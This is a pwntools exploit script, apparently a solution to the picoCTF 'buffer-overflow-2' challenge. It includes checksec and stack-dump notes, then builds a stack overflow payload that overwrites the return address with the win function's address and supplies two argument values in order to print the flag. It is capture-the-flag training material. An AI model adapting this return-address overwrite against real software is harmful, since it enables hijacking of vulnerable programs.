#! /usr/bin/python

# NOTE: need to run on the server
# /problems/buffer-overflow-2_4_ca1cb0da49310dd45c811348a235d257


from pwn import *

"""
$checksec vuln
	...
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

$ nm vuln | grep win
080485cb
"""

# we need to inject 0xDEADBEEF and 0xDEADC0DE to the first(esp+0x8)
#  and second arguments (esp+0xc)

"""
# input 75*A

#  gef> x/xw $esp+0x8
# 0xffffcc5c:	0xf7e613ac

#  gef> x/xw $esp+0xc
# 0xffffcc60:	0xf7fa9000

gef> x/100xw $esp
0xffffcc54:	0xf7fa9da7	0x00000001	0xf7e613ac	0xf7fa9000
0xffffcc64:	0xf7fa9d60	0xf7faa870	0x41414141	0x41414141
0xffffcc74:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcc84:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcc94:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcca4:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccb4:	0x00414141	0xf7e56cab	0x00000000	0xf7fa9000
0xffffccc4:	0xf7fa9000	0xffffccf8	0x080486bb	0x080487d1
0xffffccd4:	0x000003e8	0xffffccf8	0x080486c3	0x00000001
0xffffcce4:	0xffffcda4	0xffffcdac	0x000003e8	0xf7fa93dc
0xffffccf4:	0xffffcd10	0x00000000	0xf7e0f637	0xf7fa9000
0xffffcd04:	0xf7fa9000	0x00000000	0xf7e0f637	0x00000001
0xffffcd14:	0xffffcda4	0xffffcdac	0x00000000	0x00000000
0xffffcd24:	0x00000000	0xf7fa9000	0xf7ffdc04	0xf7ffd000
0xffffcd34:	0x00000000	0xf7fa9000	0xf7fa9000	0x00000000
0xffffcd44:	0x123c4fd6	0x2c4d81c6	0x00000000	0x00000000
0xffffcd54:	0x00000000	0x00000001	0x080484d0	0x00000000
0xffffcd64:	0xf7fee010	0xf7fe8880	0xf7ffd000	0x00000001
0xffffcd74:	0x080484d0	0x00000000	0x080484f1	0x0804866d
0xffffcd84:	0x00000001	0xffffcda4	0x080486d0	0x08048730
0xffffcd94:	0xf7fe8880	0xffffcd9c	0xf7ffd918	0x00000001
0xffffcda4:	0xffffcfb5	0x00000000	0xffffcfe9	0xffffcffe
0xffffcdb4:	0xffffd009	0xffffd02e	0xffffd040	0xffffd057
0xffffcdc4:	0xffffd06d	0xffffd084	0xffffd09c	0xffffd0da
0xffffcdd4:	0xffffd10f	0xffffd145	0xffffd150	0xffffd160
"""

context.terminal = ["terminator", "-e"]

# offset computed on:
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
offset = 112
winaddr = p32(0x080485cb)
new_eip = winaddr
prev_esp = "JUNK" # we dont need this but we need to control it / add to payload
first_arg = p32(0xDEADBEEF)
second_arg = p32(0XDEADC0DE)

# we also need to control the "previous ebp/esp?" so the arguments are correctly 
# loaded
payload = "A"*(offset) + new_eip + prev_esp + first_arg + second_arg
p = process("./vuln")

# attach(p, gdbscript="""
# 	break main
# 	b * 0x08048646
# 	print $ebp
# 	b * 0x08048667
# 	b * 0x08048661
# 	b * 0x0804861d
# 	x/xw $esp+0x8
# 	x/xw $esp+0xc
# 	x/100xw $esp
# 	continue
# 	""")

p.recv()
p.sendline(payload)
inline = p.recv()

import re
flag = re.findall(r"picoCTF{.*}", inline)[0]
p.close()
print flag